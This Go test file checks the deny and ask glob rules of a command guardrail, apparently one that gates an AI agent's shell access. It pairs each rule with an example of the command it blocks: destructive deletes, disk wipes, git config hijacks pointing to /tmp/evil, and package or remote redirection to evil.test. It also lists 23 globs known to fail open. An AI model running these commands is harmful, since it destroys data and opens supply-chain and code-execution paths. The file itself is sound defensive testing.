package genconfig

import (
	"sort"
	"strings"
	"testing"

	"github.com/bmatcuk/doublestar/v4"
)

// A floor glob that matches nothing is worse than a missing one: it reads
// correct in review, appears in the golden file, and stops nothing. #232 found
// the first instance — `gh repo delete*` does not match
// `gh repo delete owner/repo`, because `*` does not cross a path separator and
// a pattern containing no slash cannot match a subject that does.
//
// This guard generalises that check. Every deny and ask glob is paired with the
// command it exists to stop, and a glob that does not match its own example
// fails the build unless it is listed as known-broken with the issue tracking
// it.
//
// Scope is deliberately the deny and ask lists. An allow glob that matches
// nothing merely fails to grant an exemption, which is fail-closed; a deny or
// ask glob that matches nothing is fail-open, which is the bug class here.

// floorExamples pairs each floor glob with the canonical command it is for.
// Adding a glob without an example fails TestEveryFloorGlobHasAnExample, so
// the pairing cannot silently rot.
var floorExamples = map[string]string{
	// Recursive deletes of a filesystem-significant root.
	"rm -rf /": "rm -rf /", "rm -rf ~": "rm -rf ~",
	"rm -rf .": "rm -rf .", "rm -rf ..": "rm -rf ..",
	"rm -fr /": "rm -fr /", "rm -fr ~": "rm -fr ~",
	"rm -fr .": "rm -fr .", "rm -fr ..": "rm -fr ..",
	"rm -r -f /": "rm -r -f /", "rm -r -f ~": "rm -r -f ~",
	"rm -r -f .": "rm -r -f .", "rm -r -f ..": "rm -r -f ..",
	"rm -f -r /": "rm -f -r /", "rm -f -r ~": "rm -f -r ~",
	"rm -f -r .": "rm -f -r .", "rm -f -r ..": "rm -f -r ..",

	// Device and filesystem destroyers. Every one of these takes a device
	// path, which is exactly where the separator problem bites.
	"dd *":     "dd if=/dev/zero of=/dev/sda",
	"mkfs*":    "mkfs.ext4 /dev/sda1",
	"wipefs *": "wipefs -a /dev/sda",
	"shred *":  "shred -u /etc/passwd",
	"srm *":    "srm /etc/passwd",

	// Privilege escalation.
	"sudo *": "sudo rm -rf /etc",
	"su *":   "su root",
	"su":     "su",
	"doas *": "doas rm -rf /etc",

	// History and worktree destruction.
	"git push --force*":  "git push --force origin main",
	"git push -f*":       "git push -f origin main",
	"git clean -f*":      "git clean -fd",
	"git clean -xf*":     "git clean -xfd",
	"git clean -fx*":     "git clean -fxd",
	"git clean -df*":     "git clean -df",
	"git clean -fd*":     "git clean -fd",
	"git reset --hard*":  "git reset --hard HEAD~1",
	"git reset --keep*":  "git reset --keep HEAD~1",
	"git filter-branch*": "git filter-branch --all",
	"git filter-repo*":   "git filter-repo --force",

	// Git config keys that turn a repo into an execution vector. Each is
	// listed twice upstream, once for a bare value and once for an absolute
	// path, which is the existing workaround for the separator problem.
	"git config core.hooksPath *":    "git config core.hooksPath hooks",
	"git config core.hooksPath /**":  "git config core.hooksPath /tmp/evil",
	"git config core.fsmonitor *":    "git config core.fsmonitor evil",
	"git config core.fsmonitor /**":  "git config core.fsmonitor /tmp/evil",
	"git config core.sshCommand *":   "git config core.sshCommand evil",
	"git config core.sshCommand /**": "git config core.sshCommand /tmp/evil",
	"git config core.pager *":        "git config core.pager evil",
	"git config core.pager /**":      "git config core.pager /tmp/evil",
	"git config core.editor *":       "git config core.editor evil",
	"git config core.editor /**":     "git config core.editor /tmp/evil",
	"git config credential.* *":      "git config credential.helper evil",
	"git config credential.* /**":    "git config credential.helper /tmp/evil",
	"git config include.path *":      "git config include.path evil",
	"git config include.path /**":    "git config include.path /tmp/evil",
	"git config includeIf.* *":       "git config includeIf.gitdir:/x/.path evil",
	"git config includeIf.* /**":     "git config includeIf.gitdir:/x/.path /tmp/evil",
	"git config alias.* *":           "git config alias.co checkout",
	"git config alias.* /**":         "git config alias.co /tmp/evil",

	// Supply-chain redirection.
	"pip install --index-url*":  "pip install --index-url http://evil.test pkg",
	"pip3 install --index-url*": "pip3 install --index-url http://evil.test pkg",
	"npm install --registry*":   "npm install --registry http://evil.test pkg",

	// Container teardown.
	"docker compose down*":  "docker compose down -v",
	"docker system prune*":  "docker system prune -af",
	"docker volume prune*":  "docker volume prune -f",
	"docker network prune*": "docker network prune -f",

	// Guardrail's own session state.
	`rm *guardrail/sessions/*`: "rm -rf /home/u/.local/state/guardrail/sessions/s1",
	`rm *guardrail\sessions\*`: `rm -rf C:\Users\u\AppData\Local\guardrail\sessions\s1`,

	// GitHub CLI (#232).
	"gh pr merge{,**}":       "gh pr merge 123 --squash",
	"gh release create{,**}": "gh release create v1.0.0 --notes x",
	"gh release delete{,**}": "gh release delete v1.0.0 --yes",
	"gh workflow run{,**}":   "gh workflow run release.yml",
	"gh api -X {,**}":        "gh api -X POST repos/o/r",
	"gh api --method {,**}":  "gh api --method DELETE repos/o/r/x",
	"gh repo delete{,**}":    "gh repo delete owner/repo --yes",

	// Porcelain families (#228). Each example carries a slash-bearing or
	// flag-bearing argument where the real command would, so the guard is
	// checking the case that broke `gh repo delete*`.
	"gh secret set{,**}":      "gh secret set MY_TOKEN --repo owner/repo",
	"gh secret delete{,**}":   "gh secret delete MY_TOKEN --repo owner/repo",
	"gh variable set{,**}":    "gh variable set MY_VAR --body xyz",
	"gh variable delete{,**}": "gh variable delete MY_VAR",
	"gh repo edit{,**}":       "gh repo edit owner/repo --visibility public",
	"gh repo archive{,**}":    "gh repo archive owner/repo",
	"gh repo rename{,**}":     "gh repo rename new-name",
	"gh repo transfer{,**}":   "gh repo transfer owner/repo neworg",
	"gh auth switch{,**}":     "gh auth switch --user other-account",
	"gh auth login{,**}":      "gh auth login --scopes admin:org",
	"gh auth refresh{,**}":    "gh auth refresh -s admin:org",
	"gh auth logout{,**}":     "gh auth logout",
	"gh ssh-key add{,**}":     "gh ssh-key add /home/u/.ssh/id_ed25519.pub",
	"gh gpg-key add{,**}":     "gh gpg-key add key.asc",
	"gh release edit{,**}":    "gh release edit v1.0.0 --draft=false",
	"gh release upload{,**}":  "gh release upload v1.0.0 asset.zip --clobber",

	// Permission and process changes.
	"chmod -R *":     "chmod -R 777 /var/www",
	"chmod 777 *":    "chmod 777 /etc/passwd",
	"chmod -R 777 *": "chmod -R 777 /var/www",
	"chown -R *":     "chown -R root /var/www",
	"truncate *":     "truncate -s 0 /var/log/app.log",
	"kill -9 *":      "kill -9 1234",
	"killall *":      "killall node",
	"pkill *":        "pkill -f node",

	// Workspace discard and remote redirection.
	"git checkout .":       "git checkout .",
	"git restore .":        "git restore .",
	"git branch -D *":      "git branch -D feature",
	"git commit --amend*":  "git commit --amend --no-edit",
	"git remote add *":     "git remote add evil http://evil.test/x.git",
	"git remote set-url *": "git remote set-url origin http://evil.test/x.git",
	"git stash clear":      "git stash clear",
	"git stash drop*":      "git stash drop",

	// Protected refs and release pointers (#218).
	"git push * main":    "git push origin main",
	"git push * master":  "git push origin master",
	"git push --tags*":   "git push --tags",
	"git push * v[0-9]*": "git push origin v1.2.3",

	// Package installs.
	"pip install *":   "pip install requests",
	"pip3 install *":  "pip3 install requests",
	"npm install *":   "npm install left-pad",
	"npm i *":         "npm i left-pad",
	"npm ci*":         "npm ci",
	"yarn add *":      "yarn add left-pad",
	"pnpm add *":      "pnpm add left-pad",
	"gem install *":   "gem install rails",
	"cargo install *": "cargo install ripgrep",
	"go install *":    "go install example.com/x@latest",
	"go get *":        "go get example.com/x",
}

// knownUnmatchedFloorGlobs are globs that do not match their own example.
//
// Every one fails for the same reason: `*` does not cross a path separator in
// this matcher, and the command each exists to stop takes a path, URL or
// dotted-path argument. They are recorded rather than fixed here because
// changing them alters what the floor stops on both planes at once, and
// because the right replacement depends on the production matchers' real
// semantics, which cannot be established from inside this repo. A rewrite
// tuned to the wrong model would be worse than this list: it would look fixed.
//
// Tracked in #244, which carries the evidence and the order of work.
//
// Shrinking this map is the fix. Adding to it needs a reason, and the guard
// makes a 24th entry a deliberate act rather than an accident.
const separatorReason = "#244: `*` does not cross a path separator and the argument is a path"

var knownUnmatchedFloorGlobs = map[string]string{
	"sudo *":                     separatorReason,
	"doas *":                     separatorReason,
	"dd *":                       separatorReason,
	"mkfs*":                      separatorReason,
	"wipefs *":                   separatorReason,
	"shred *":                    separatorReason,
	"srm *":                      separatorReason,
	"chmod -R *":                 separatorReason,
	"chmod 777 *":                separatorReason,
	"chmod -R 777 *":             separatorReason,
	"chown -R *":                 separatorReason,
	"truncate *":                 separatorReason,
	"rm *guardrail/sessions/*":   separatorReason,
	`rm *guardrail\sessions\*`:   separatorReason,
	"pip install --index-url*":   separatorReason,
	"pip3 install --index-url*":  separatorReason,
	"npm install --registry*":    separatorReason,
	"git remote add *":           separatorReason,
	"git remote set-url *":       separatorReason,
	"git config includeIf.* *":   separatorReason,
	"git config includeIf.* /**": separatorReason,
	"go install *":               separatorReason,
	"go get *":                   separatorReason,
}

func floorGuardGlobs(t *testing.T) []string {
	t.Helper()
	var out []string
	for _, g := range append(bashDenyGlobs(), bashAskGlobs()...) {
		pattern, ok := stripWrapper("Bash(", g)
		if !ok {
			t.Errorf("malformed floor glob %q", g)
			continue
		}
		out = append(out, pattern)
	}
	sort.Strings(out)
	return out
}

// A new glob without an example is a new glob nobody has checked.
func TestEveryFloorGlobHasAnExample(t *testing.T) {
	for _, pattern := range floorGuardGlobs(t) {
		if _, ok := floorExamples[pattern]; !ok {
			t.Errorf("floor glob %q has no documented example command; add one to floorExamples so it is checked", pattern)
		}
	}
}

// The guard itself: a deny or ask glob must match the command it exists to
// stop. A miss here is fail-open, not cosmetic.
func TestEveryFloorGlobMatchesItsExample(t *testing.T) {
	for _, pattern := range floorGuardGlobs(t) {
		example, ok := floorExamples[pattern]
		if !ok {
			continue // reported by TestEveryFloorGlobHasAnExample
		}
		matched, err := doublestar.Match(pattern, example)
		if err != nil {
			t.Errorf("floor glob %q is not a valid pattern: %v", pattern, err)
			continue
		}
		reason, known := knownUnmatchedFloorGlobs[pattern]
		switch {
		case matched && known:
			t.Errorf("floor glob %q now matches %q -- remove it from knownUnmatchedFloorGlobs", pattern, example)
		case !matched && !known:
			t.Errorf("floor glob %q does not match its own example %q -- it will not stop the thing it is for", pattern, example)
		case !matched && known:
			t.Logf("known unmatched: %q vs %q -- %s", pattern, example, reason)
		}
	}
}

// The examples have to be examples of the right thing. A pattern that matches
// every string would pass the guard while proving nothing.
func TestFloorExamplesAreNotVacuous(t *testing.T) {
	for pattern, example := range floorExamples {
		if strings.TrimSpace(example) == "" {
			t.Errorf("floor glob %q has an empty example", pattern)
		}
		if pattern == "*" || pattern == "**" {
			t.Errorf("floor glob %q matches everything", pattern)
		}
	}
}

// Stale entries are their own rot: an example for a glob that no longer
// exists reads as coverage that is not there.
func TestFloorExamplesHaveNoStaleEntries(t *testing.T) {
	live := map[string]bool{}
	for _, pattern := range floorGuardGlobs(t) {
		live[pattern] = true
	}
	for pattern := range floorExamples {
		if !live[pattern] {
			t.Errorf("floorExamples has %q, which is no longer a floor glob", pattern)
		}
	}
	for pattern := range knownUnmatchedFloorGlobs {
		if !live[pattern] {
			t.Errorf("knownUnmatchedFloorGlobs has %q, which is no longer a floor glob", pattern)
		}
	}
}
